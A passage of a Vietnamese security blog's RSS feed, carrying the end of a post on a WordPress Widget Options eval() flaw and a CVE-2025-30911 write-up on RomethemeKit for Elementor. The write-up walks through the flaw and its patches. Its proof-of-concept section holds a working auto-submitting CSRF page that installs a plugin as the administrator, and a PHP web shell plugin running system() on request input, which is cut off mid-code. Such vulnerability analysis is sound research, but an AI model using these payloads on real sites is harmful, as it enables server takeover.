id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng trong &lt;strong&gt;Widget Options &amp;lt;= 4.0.7&lt;/strong&gt; xuất phát từ việc sử dụng &lt;strong&gt;&lt;code&gt;eval()&lt;/code&gt; không an toàn&lt;/strong&gt; trong tính năng &lt;strong&gt;display logic&lt;/strong&gt;. Dữ liệu do người dùng kiểm soát từ thuộc tính block &lt;code&gt;extended_widget_opts&lt;/code&gt; được truyền trực tiếp vào hàm &lt;code&gt;widgetopts_safe_eval()&lt;/code&gt; mà &lt;strong&gt;không được kiểm tra, lọc hoặc xác thực đầy đủ&lt;/strong&gt;. Điều này cho phép kẻ tấn công đã &lt;strong&gt;xác thực&lt;/strong&gt; với quyền &lt;strong&gt;Contributor (hoặc cao hơn)&lt;/strong&gt; chèn và thực thi mã PHP tùy ý trong quá trình render block, dẫn đến &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt; trên server.&lt;/p&gt;&#xA;&lt;p&gt;Mặc dù các phiên bản sau đã bổ sung cơ chế kiểm tra biểu thức (expression validation), nhưng nguyên nhân gốc vẫn nằm ở việc &lt;strong&gt;tin tưởng dữ liệu logic chưa được lọc&lt;/strong&gt; và cho phép thực thi động bằng &lt;code&gt;eval()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Tuyệt đối &lt;strong&gt;không truyền dữ liệu do người dùng kiểm soát vào &lt;code&gt;eval()&lt;/code&gt;&lt;/strong&gt;, kể cả trong các tính năng “logic” hay “điều kiện”.&lt;/li&gt;&#xA;&lt;li&gt;Tất cả thuộc tính của block / widget phải được &lt;strong&gt;xác thực (validate) và làm sạch (sanitize)&lt;/strong&gt; nghiêm ngặt trước khi sử dụng.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Quyền Contributor vẫn có thể rất nguy hiểm&lt;/strong&gt; nếu kết hợp với các cơ chế thực thi mã không an toàn ở phía server.&lt;/li&gt;&#xA;&lt;li&gt;Tránh thực thi mã động; thay vào đó hãy sử dụng &lt;strong&gt;parser an toàn&lt;/strong&gt; hoặc &lt;strong&gt;danh sách trắng (whitelist) các biểu thức hợp lệ&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/widget-options/vulnerability/wordpress-widget-options-plugin-4-0-7-authenticated-contributor-remote-code-execution-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Widget Options Plugin &amp;lt;= 4.0.7 is vulnerable to Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-30911 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-03-cve-2025-30911/</link>
      <pubDate>Wed, 03 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-03-cve-2025-30911/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-03-cve-2025-30911/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;Improper Control of Generation of Code (&amp;lsquo;Code Injection&amp;rsquo;)&lt;/strong&gt; trong &lt;strong&gt;Rometheme RomethemeKit For Elementor&lt;/strong&gt; cho phép xảy ra &lt;strong&gt;Command Injection&lt;/strong&gt;. Vấn đề này ảnh hưởng đến &lt;strong&gt;RomethemeKit For Elementor&lt;/strong&gt; từ n/a đến phiên bản &lt;strong&gt;1.5.4&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-30911&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-30911&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.5.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.5.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subcriber&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/rometheme-for-elementor/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress RTMKit Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;RTMKit&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.5.3&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.5.5&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi chú&lt;/p&gt;&lt;p&gt;Lỗ hổng được công bố xảy ra đến phiên bản &lt;strong&gt;1.5.4&lt;/strong&gt; nhưng thực sự nó đã được vá một phần trong phiên bản này, nên tôi chọn phiên bản &lt;strong&gt;1.5.3&lt;/strong&gt; để phân tích&lt;/p&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Trong phiên bản lỗi (v1.5.3):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function install_requirements()&#xA;{&#xA;    include_once ABSPATH . &amp;#39;wp-admin/includes/plugin.php&amp;#39;;&#xA;    include_once ABSPATH . &amp;#39;wp-admin/includes/file.php&amp;#39;;&#xA;    include_once ABSPATH . &amp;#39;wp-admin/includes/misc.php&amp;#39;;&#xA;    include_once ABSPATH . &amp;#39;wp-admin/includes/class-wp-upgrader.php&amp;#39;;&#xA;&#xA;    $plugin = $_POST[&amp;#39;plugin&amp;#39;];&#xA;    $plugin_file = WP_PLUGIN_DIR . &amp;#39;/&amp;#39; . $plugin;&#xA;    $plugin_slug = dirname($plugin);&#xA;&#xA;    if (file_exists($plugin_file)) {&#xA;        // Activate the plugin if already installed but inactive&#xA;        ob_start();&#xA;        activate_plugin($plugin);&#xA;        ob_clean();&#xA;        ob_end_clean();&#xA;        wp_send_json_success(&amp;#34;Install and Activate Successfully&amp;#34;);&#xA;    } else {&#xA;        ob_start();&#xA;        $plugin_download_url = &amp;#34;https://downloads.wordpress.org/plugin/{$plugin_slug}.latest-stable.zip&amp;#34;; // Adjust URL structure&#xA;        $upgrader = new \Plugin_Upgrader();&#xA;        $result = $upgrader-&amp;gt;install($plugin_download_url);&#xA;&#xA;        if (is_wp_error($result)) {&#xA;            wp_send_json_error();&#xA;        }&#xA;        $activate_result = activate_plugin($plugin);&#xA;        if (is_wp_error($activate_result)) {&#xA;            wp_send_json_error(&amp;#39;Plugin installed but failed to activate: &amp;#39; . $activate_result-&amp;gt;get_error_message());&#xA;        }&#xA;&#xA;        wp_send_json_success(&amp;#39;Plugin installed and activated successfully.&amp;#39;);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;install_requirements()&lt;/code&gt; cho phép tải và kích hoạt plugin dựa trên giá trị của &lt;code&gt;$_POST[&#39;plugin&#39;]&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Nếu plugin đã tải mà chưa active thì thực hiện active:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (file_exists($plugin_file)) {&#xA;    // Activate the plugin if already installed but inactive&#xA;    ob_start();&#xA;    activate_plugin($plugin);&#xA;    ob_clean();&#xA;    ob_end_clean();&#xA;    wp_send_json_success(&amp;#34;Install and Activate Successfully&amp;#34;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nếu plugin chưa tải thì thực hiện tải nó về&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Tuy nhiên, hàm này không có bất kỳ kiểm tra quyền người dùng nào.&lt;/p&gt;&#xA;&lt;p&gt;Sang phiên bản &lt;code&gt;v1.5.4&lt;/code&gt;, nhà phát triển đã vá một phần bằng cách thêm đoạn:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (!current_user_can(&amp;#39;manage_options&amp;#39;)) {&#xA;    wp_die();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;manage_options&lt;/code&gt; là quyền chỉ dành cho &lt;strong&gt;Administrator&lt;/strong&gt;, vì vậy giờ đây chỉ tài khoản Admin mới có thể gọi được chức năng này. Việc này đã ngăn được user thông thường (&lt;strong&gt;Subscriber&lt;/strong&gt;, &lt;strong&gt;Author&lt;/strong&gt;, v.v.) và người không đăng nhập trực tiếp khai thác lỗ hổng.&lt;/p&gt;&#xA;&lt;p&gt;Tuy nhiên, bản vá này vẫn chưa đủ an toàn. Vì sao?&lt;/p&gt;&#xA;&lt;p&gt;Mặc dù đã giới hạn quyền là &lt;strong&gt;Administrator&lt;/strong&gt;, nhưng hàm này không có cơ chế chống &lt;strong&gt;CSRF (Cross-Site Request Forgery)&lt;/strong&gt;. Điều này có nghĩa là:&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;Nếu &lt;strong&gt;Administrator&lt;/strong&gt; đang đăng nhập vào website WordPress và truy cập vào một trang web độc hại do attacker kiểm soát thì trang đó có thể bí mật gửi một request (POST) tới &lt;code&gt;install_requirements&lt;/code&gt; request này sẽ được thực hiện với quyền của &lt;strong&gt;Administrator&lt;/strong&gt;, vì trình duyệt đang mang theo cookie đăng nhập.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;Đến phiên bản &lt;strong&gt;v1.5.5&lt;/strong&gt;, nhà phát triển mới thực sự vá hoàn chỉnh lỗ hổng bằng cách thêm kiểm tra nonce:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (!isset($_POST[&amp;#39;wpnonce&amp;#39;]) ||  !wp_verify_nonce($_POST[&amp;#39;wpnonce&amp;#39;], &amp;#39;rtm_template_nonce&amp;#39;)) {&#xA;    wp_send_json_error(&amp;#39;Access Denied&amp;#39;);&#xA;    wp_die();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi kết hợp cả hai lớp bảo vệ:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;current_user_can(&#39;manage_options&#39;)&lt;/code&gt; → kiểm tra quyền&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_verify_nonce()&lt;/code&gt; → chống CSRF&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Thì lỗ hổng mới được vá đúng cách.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký một ajax dành cho người dùng đã đăng nhập (&lt;code&gt;wp_ajax_&lt;/code&gt;):&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&amp;#39;wp_ajax_install_requirements&amp;#39;, [$this, &amp;#39;install_requirements&amp;#39;]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi truy cập đến endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; với &lt;code&gt;action=install_requirements&lt;/code&gt; thì callback &lt;code&gt;install_requirements&lt;/code&gt; được gọi.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Administrator is logged in to the WordPress site&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Administrator visits a malicious website controlled by the attacker&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;Malicious page sends a forged POST request to /wp-admin/admin-ajax.php?action=install_requirements&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Browser automatically includes Administrator cookies&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;WordPress treats the request as coming from an authenticated Admin&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;install_requirements() is executed without nonce validation&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;Untrusted $_POST[&amp;#39;plugin&amp;#39;] is processed&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;Plugin_Upgrader-&amp;gt;install()&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;activate_plugin()&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;Malicious plugin is installed and activated&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Tạo trang web chứa payload và gửi cho Administrator:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;&#xA;  &amp;lt;body&amp;gt;&#xA;    &amp;lt;form action=&amp;#34;http://localhost/wp-admin/admin-ajax.php&amp;#34; method=&amp;#34;POST&amp;#34;&amp;gt;&#xA;      &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;action&amp;#34; value=&amp;#34;install&amp;amp;#95;requirements&amp;#34; /&amp;gt;&#xA;      &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;plugin&amp;#34; value=&amp;#34;malicious&amp;amp;#95;plugin&amp;amp;#47;malicious&amp;amp;#95;plugin&amp;amp;#95;dir&amp;amp;#46;php&amp;#34; /&amp;gt;&#xA;      &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Submit request&amp;#34; /&amp;gt;&#xA;    &amp;lt;/form&amp;gt;&#xA;    &amp;lt;script&amp;gt;&#xA;      history.pushState(&amp;#39;&amp;#39;, &amp;#39;&amp;#39;, &amp;#39;/&amp;#39;);&#xA;      document.forms[0].submit();&#xA;    &amp;lt;/script&amp;gt;&#xA;  &amp;lt;/body&amp;gt;&#xA;&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Khi Administrator truy cập lần 2, plugin sẽ được active&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;Ví dụ plugin:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (!defined(&amp;#39;ABSPATH&amp;#39;)) {&#xA;    exit;&#xA;}&#xA;&#xA;add_action(&amp;#39;init&amp;#39;, function () {&#xA;    if (isset($_REQUEST[&amp;#39;cmd&amp;#39;])) {&#xA;        system($_REQUEST[&amp;#39;cmd&amp;#39;]);&#xA;    